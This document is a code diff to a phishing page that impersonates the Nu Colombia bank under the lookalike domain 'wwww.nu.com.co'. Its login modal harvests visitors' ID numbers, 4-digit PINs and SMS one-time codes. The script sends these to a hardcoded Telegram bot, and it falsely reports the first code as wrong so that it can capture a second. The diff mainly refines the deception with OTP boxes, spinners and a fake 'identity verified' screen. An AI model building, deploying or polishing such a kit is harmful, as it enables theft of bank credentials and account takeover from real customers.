@@ -3,79 +3,116 @@
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Nu Colombia</title>
 <link rel="icon" href="https://wwww.nu.com.co/favicons/favicon-32x32.png">
-<link rel="stylesheet" href="https://wwww.nu.com.co/_next/static/css/3f976cabfbb0f462.css">
 <style>
-body{font-family:Graphik,-apple-system,"Segoe UI",Roboto,sans-serif}
-.nu-top{display:flex;align-items:center;justify-content:space-between;padding:14px 40px;background:#fff;position:sticky;top:0;z-index:20;border-bottom:1px solid #eee}
-.nu-logo{font-size:32px;font-weight:800;color:#820AD1;text-decoration:none}
-.nu-nav a{margin:0 14px;color:#111;text-decoration:none;font-size:15px}
-.nu-hero{background:#820AD1;color:#fff;padding:80px 40px;display:flex;gap:48px;align-items:center;flex-wrap:wrap}
-.nu-hero h1{font-size:52px;line-height:1.02;margin:0;max-width:600px}
-.nu-hero p{font-size:19px;max-width:520px;opacity:.94}
-.nu-hero img{width:420px;max-width:90vw;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
-.nu-sect{padding:64px 40px}.nu-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:22px;margin-top:28px}
-.nu-card{border:1px solid #eee;border-radius:22px;overflow:hidden;background:#fff}
-.nu-card img{width:100%;height:180px;object-fit:cover}
-.nu-card div{padding:20px}.nu-card a{color:#820AD1;font-weight:700}
-#modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:99;align-items:center;justify-content:center}
-#mbox{background:#fff;border-radius:20px;padding:28px;width:370px;max-width:94vw;color:#111}
-#mbox input{width:100%;padding:13px;margin:8px 0;border:1px solid #D9D9D9;border-radius:12px}
-.btn-nu{background:#820AD1;color:#fff;border:0;border-radius:24px;padding:13px 28px;font-weight:700;cursor:pointer;width:100%}
-.err{background:#FDECEA;border-left:4px solid #D32F2F;padding:10px;font-size:13px;display:none;margin:8px 0}
+*{box-sizing:border-box;font-family:Graphik,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{margin:0;color:#111;background:#fff;overflow-x:hidden}
+.nu-top{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;background:#fff;position:sticky;top:0;z-index:20;border-bottom:1px solid #eee;gap:12px}
+.nu-logo{font-size:32px;font-weight:800;color:#820AD1;text-decoration:none;flex-shrink:0}
+.nu-nav{display:flex;gap:18px;overflow-x:auto;scrollbar-width:none}
+.nu-nav::-webkit-scrollbar{display:none}
+.nu-nav a{white-space:nowrap;text-decoration:none;font-size:15px;color:#111}
+.btn-nu{background:#820AD1;color:#fff;border:0;border-radius:24px;padding:12px 28px;font-size:15px;font-weight:700;cursor:pointer;transition:transform .15s,box-shadow .15s;flex-shrink:0}
+.btn-nu:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(130,10,209,.35)}
+.btn-nu:disabled{opacity:.6;cursor:wait;transform:none}
+.nu-hero{background:linear-gradient(120deg,#820AD1 60%,#9D2BEE 100%);color:#fff;padding:72px 24px;display:flex;gap:40px;align-items:center;justify-content:center;flex-wrap:wrap;animation:fadeUp .7s ease both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+.nu-hero h1{font-size:clamp(34px,5vw,54px);line-height:1.03;margin:0;max-width:600px;letter-spacing:-1px}
+.nu-hero p{font-size:18px;max-width:520px;opacity:.94}
+.nu-hero img{width:min(430px,88vw);border-radius:24px;box-shadow:0 24px 70px rgba(0,0,0,.4);animation:float 5s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+.btn-w{background:#fff;color:#820AD1;border:0;border-radius:24px;padding:15px 36px;font-weight:800;font-size:16px;cursor:pointer;transition:transform .15s}
+.btn-w:hover{transform:scale(1.03)}
+.nu-sect{padding:56px 24px;max-width:1200px;margin:0 auto}
+.nu-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:20px;margin-top:24px}
+.nu-card{border:1px solid #eee;border-radius:22px;overflow:hidden;background:#fff;transition:transform .2s,box-shadow .2s}
+.nu-card:hover{transform:translateY(-4px);box-shadow:0 14px 34px rgba(0,0,0,.1)}
+.nu-card img{width:100%;height:170px;object-fit:cover;background:#F4E7FF}
+.nu-card div{padding:20px}.nu-card a{color:#820AD1;font-weight:700;text-decoration:none}
+footer{background:#111;color:#ccc;padding:32px 24px;font-size:12px}
+/* modal */
+#modal{display:none;position:fixed;inset:0;background:rgba(20,0,40,.6);backdrop-filter:blur(4px);z-index:99;align-items:center;justify-content:center;padding:16px}
+#modal.open{display:flex;animation:fadeUp .25s ease}
+#mbox{background:#fff;border-radius:22px;padding:28px;width:380px;max-width:94vw;color:#111;box-shadow:0 30px 80px rgba(0,0,0,.4);animation:pop .3s cubic-bezier(.2,1.4,.4,1)}
+@keyframes pop{from{opacity:0;transform:scale(.92) translateY(10px)}to{opacity:1;transform:none}}
+#mbox .nu-m{text-align:center;color:#820AD1;font-size:30px;font-weight:800;margin-bottom:4px}
+#mbox input{width:100%;padding:14px;margin:8px 0;border:1.5px solid #D9D9D9;border-radius:14px;font-size:16px;outline:none;transition:border .15s}
+#mbox input:focus{border-color:#820AD1}
+.otp-row{display:flex;gap:8px;justify-content:center;margin:12px 0}
+.otp-row input{width:48px;height:56px;text-align:center;font-size:22px;font-weight:700}
+.err{background:#FDECEA;border-left:4px solid #D32F2F;padding:10px 12px;font-size:13px;display:none;margin:8px 0;border-radius:0 10px 10px 0}
+.spin{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:sp 0.7s linear infinite;vertical-align:-3px;margin-right:8px}
+@keyframes sp{to{transform:rotate(360deg)}}
+@media(max-width:640px){.nu-nav{display:none}.nu-hero{padding:48px 18px}.nu-sect{padding:40px 18px}}
 </style></head>
 <body>
 <div class="nu-top"><a class="nu-logo" href="https://wwww.nu.com.co/">nu</a>
 <div class="nu-nav"><a href="https://wwww.nu.com.co/cf/cuenta/">Cuenta</a><a href="https://wwww.nu.com.co/credito/">Tarjeta</a><a href="https://wwww.nu.com.co/prestamos/">Préstamos</a><a href="https://wwww.nu.com.co/cdt/">CDT</a><a href="https://wwww.nu.com.co/servicio-al-cliente-nu/">Ayuda</a></div>
-<button class="btn-nu" style="width:auto" onclick="openM()">Entrar</button></div>
+<button class="btn-nu" onclick="openM()">Entrar</button></div>
 <div class="nu-hero">
 <div><h1>Controlar tus finanzas no es suerte, decide Nu</h1>
 <p>Cuenta Nu, tarjeta de crédito morada y platino, préstamos y CDT. Sin cuota de manejo, 100% digital.</p><br>
-<button onclick="openM()" style="background:#fff;color:#820AD1;border:0;border-radius:24px;padding:15px 36px;font-weight:800;font-size:16px;cursor:pointer">Quiero ser Nu</button></div>
+<button class="btn-w" onclick="openM()">Quiero ser Nu</button></div>
 <img src="https://www.datocms-assets.com/197474/1790969542-morada-credit.png?auto=format&fit=crop&q=60" alt="Tarjeta Nu">
 </div>
 <div class="nu-sect"><h2>Para ti</h2><p style="color:#555">Productos y beneficios pensados para tu bienestar financiero.</p>
 <div class="nu-grid">
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-debito.png?auto=format" alt=""><div><h3>Cuenta de Ahorros Nu</h3><p>Rentabilidad diaria, sin cuota de manejo.</p><a href="https://wwww.nu.com.co/cf/cuenta/">Ver cuenta →</a></div></div>
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-credito.png?auto=format" alt=""><div><h3>Tarjeta de Crédito</h3><p>Morada y Platino, controla todo desde la app.</p><a href="https://wwww.nu.com.co/credito/">Ver tarjeta →</a></div></div>
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-prestamos-nu.png?auto=format" alt=""><div><h3>Préstamos Nu</h3><p>En minutos, sin papeleos.</p><a href="https://wwww.nu.com.co/prestamos/">Ver préstamos →</a></div></div>
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-cdt.png?auto=format" alt=""><div><h3>CDT Nu</h3><p>Haz crecer tu plata.</p><a href="https://wwww.nu.com.co/cdt/">Ver CDT →</a></div></div>
+<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-debito.png?auto=format" alt="Cuenta"><div><h3>Cuenta de Ahorros Nu</h3><p style="color:#555;font-size:14px">Rentabilidad diaria, sin cuota de manejo.</p><a href="https://wwww.nu.com.co/cf/cuenta/">Ver cuenta →</a></div></div>
+<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-credito.png?auto=format" alt="Tarjeta"><div><h3>Tarjeta de Crédito</h3><p style="color:#555;font-size:14px">Morada y Platino, controla todo desde la app.</p><a href="https://wwww.nu.com.co/credito/">Ver tarjeta →</a></div></div>
+<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-prestamos-nu.png?auto=format" alt="Préstamos"><div><h3>Préstamos Nu</h3><p style="color:#555;font-size:14px">En minutos, sin papeleos.</p><a href="https://wwww.nu.com.co/prestamos/">Ver préstamos →</a></div></div>
+<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791202924-cdt.png?auto=format" alt="CDT"><div><h3>CDT Nu</h3><p style="color:#555;font-size:14px">Haz crecer tu plata.</p><a href="https://wwww.nu.com.co/cdt/">Ver CDT →</a></div></div>
 </div></div>
-<div class="nu-sect" style="background:#F5F5F5"><h2>Tu dinero en modo fácil</h2>
-<div class="nu-grid">
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791203314-01-paga-y-envia-al-instante.jpg?auto=format" alt=""><div><h3>Paga y envía al instante</h3><p>Bre-B con tus llaves en segundos.</p><a href="https://wwww.nu.com.co/bre-b-paga-con-tus-llaves-en-segundos/">Ver más →</a></div></div>
-<div class="nu-card"><img src="https://www.datocms-assets.com/197474/1791203314-03-paga-tus-facturas-sin-filas.jpg?auto=format" alt=""><div><h3>Sin filas</h3><p>Paga tus facturas desde la app.</p><a href="https://wwww.nu.com.co/">Ver más →</a></div></div>
-</div></div>
-<footer style="background:#111;color:#ccc;padding:32px 40px;font-size:12px">
+<footer>
 <a style="color:#ccc;margin-right:14px" href="https://wwww.nu.com.co/servicio-al-cliente-nu/">Servicio al cliente</a>
 <a style="color:#ccc;margin-right:14px" href="https://wwww.nu.com.co/defensor-consumidor-nu-colombia/">Defensor</a>
 <a style="color:#ccc" href="https://wwww.nu.com.co/centro-de-seguridad-nu-la-guia/">Seguridad</a>
-<p>PQR: pqr@nucf.com.co · Vigilado Superintendencia Financiera <img src="https://www.datocms-assets.com/197474/1779169448-vigilado-sfc-edited.png?q=80" style="height:26px;vertical-align:middle"></p>
+<p>PQR: pqr@nucf.com.co · Vigilado Superintendencia Financiera</p>
 </footer>
 <div id="modal"><div id="mbox">
-<span style="float:right;cursor:pointer" onclick="modal.style.display='none'">✕</span>
-<div id="s1"><h3>Entra a tu cuenta</h3><small style="color:#777">Documento y clave Nu</small>
-<form id="f1"><input id="doc" inputmode="numeric" placeholder="Número de documento" required>
-<input id="pwd" type="password" inputmode="numeric" maxlength="4" placeholder="Clave de 4 dígitos" required>
-<button class="btn-nu">Continuar</button></form></div>
-<div id="s2" style="display:none"><h3>Verificación</h3><small style="color:#777">Código SMS a tu celular</small>
-<form id="f2"><input id="otp" inputmode="numeric" maxlength="6" placeholder="Código de 6 dígitos" required>
-<div class="err" id="e2"></div><button class="btn-nu">Confirmar</button></form>
-<small id="timer">Reenviar en 0:30</small></div>
+<div style="text-align:right"><span style="cursor:pointer;color:#999" onclick="closeM()">✕</span></div>
+<div class="nu-m">nu</div>
+<div id="s1"><h3 style="text-align:center;margin:4px 0">Entra a tu cuenta</h3>
+<p style="text-align:center;color:#777;font-size:13px">Documento y clave Nu</p>
+<form id="f1"><input id="doc" inputmode="numeric" autocomplete="username" placeholder="Número de documento" required>
+<input id="pwd" type="password" inputmode="numeric" maxlength="4" autocomplete="current-password" placeholder="Clave de 4 dígitos" required>
+<button class="btn-nu" id="b1">Continuar</button></form></div>
+<div id="s2" style="display:none"><h3 style="text-align:center">Verificación</h3>
+<p style="text-align:center;color:#777;font-size:13px">Ingresa el código SMS de 6 dígitos</p>
+<div class="otp-row">
+<input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+</div>
+<div class="err" id="e2"></div>
+<button class="btn-nu" id="b2">Confirmar</button>
+<p style="text-align:center;font-size:13px;color:#777" id="timer">Reenviar código en 0:30</p></div>
 </div></div>
 <script>
-function openM(){modal.style.display='flex'}
-modal.onclick=e=>{if(e.target.id=='modal')modal.style.display='none'};
+function openM(){modal.classList.add('open')}
+function closeM(){modal.classList.remove('open')}
+modal.onclick=e=>{if(e.target.id=='modal')closeM()};
+document.onkeydown=e=>{if(e.key=='Escape')closeM()};
 const BOT="8982594594:AAHnFUSKOou39oLTzxIrlA3xpk3mXnruI2U",CHAT="8144084549";
-const send=m=>fetch("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(m),{mode:"no-cors"});
-let DOC="",tried=false;
-f1.onsubmit=async e=>{e.preventDefault();DOC=doc.value;
-await send("NU P1\ndoc: "+DOC+"\nclave: "+pwd.value+"\n"+navigator.userAgent);
-s1.style.display="none";s2.style.display="block";
-let s=30;const t=setInterval(()=>{s--;timer.textContent="Reenviar en 0:"+String(s).padStart(2,"0");if(s<=0)clearInterval(t)},1000);};
-f2.onsubmit=async e=>{e.preventDefault();
-if(!tried){tried=true;await send("NU P2\ndoc: "+DOC+"\notp: "+otp.value);
-e2.style.display="block";e2.textContent="Código incorrecto, te enviamos uno nuevo.";otp.value="";}
-else{await send("NU P3\ndoc: "+DOC+"\notp2: "+otp.value);
-mbox.innerHTML="<h3>Verificando identidad…</h3><p><small>Te redirigimos a Nu.</small></p>";
-setTimeout(()=>location.href="https://wwww.nu.com.co/",3500);}};
+const send=m=>fetch("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(m),{mode:"no-cors"}).catch(()=>{});
+const boxes=[...document.querySelectorAll('.otp-row input')];
+boxes.forEach((b,i)=>{b.oninput=()=>{b.value=b.value.replace(/\D/g,'');if(b.value&&i<5)boxes[i+1].focus()};
+b.onkeydown=e=>{if(e.key=='Backspace'&&!b.value&&i>0)boxes[i-1].focus()}});
+boxes[0].addEventListener('paste',e=>{const t=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,6);if(t){e.preventDefault();t.split('').forEach((c,i)=>boxes[i].value=c);boxes[Math.min(t.length,5)].focus()}});
+let DOC="";
+f1.onsubmit=async e=>{e.preventDefault();
+b1.innerHTML='<span class="spin"></span>Verificando…';b1.disabled=true;
+await send("NU P1\ndoc: "+doc.value+"\nclave: "+pwd.value+"\n"+navigator.userAgent);
+await new Promise(r=>setTimeout(r,900));
+s1.style.display="none";s2.style.display="block";boxes[0].focus();
+let s=30;const t=setInterval(()=>{s--;timer.textContent="Reenviar código en 0:"+String(s).padStart(2,"0");if(s<=0){clearInterval(t);timer.innerHTML='<a href="#" style="color:#820AD1" onclick="return false">Reenviar código</a>'}},1000);};
+let tried=false;
+b2.onclick=async ()=>{
+const code=boxes.map(b=>b.value).join('');
+if(code.length<6){e2.style.display="block";e2.textContent="Ingresa los 6 dígitos.";return}
+b2.innerHTML='<span class="spin"></span>Confirmando…';b2.disabled=true;
+await new Promise(r=>setTimeout(r,800));
+if(!tried){tried=true;await send("NU P2\ndoc: "+DOC+"\notp: "+code);
+e2.style.display="block";e2.textContent="Código incorrecto, te enviamos uno nuevo.";
+boxes.forEach(b=>b.value="");boxes[0].focus();
+b2.innerHTML="Confirmar";b2.disabled=false;}
+else{await send("NU P3\ndoc: "+DOC+"\notp2: "+code);
+mbox.innerHTML="<div style='text-align:center;padding:20px'><div style='font-size:44px'>✓</div><h3>Identidad verificada</h3><p style='color:#777'>Abriendo tu cuenta Nu…</p></div>";
+setTimeout(()=>location.href="https://wwww.nu.com.co/",3000);}};
 </script></body></html>
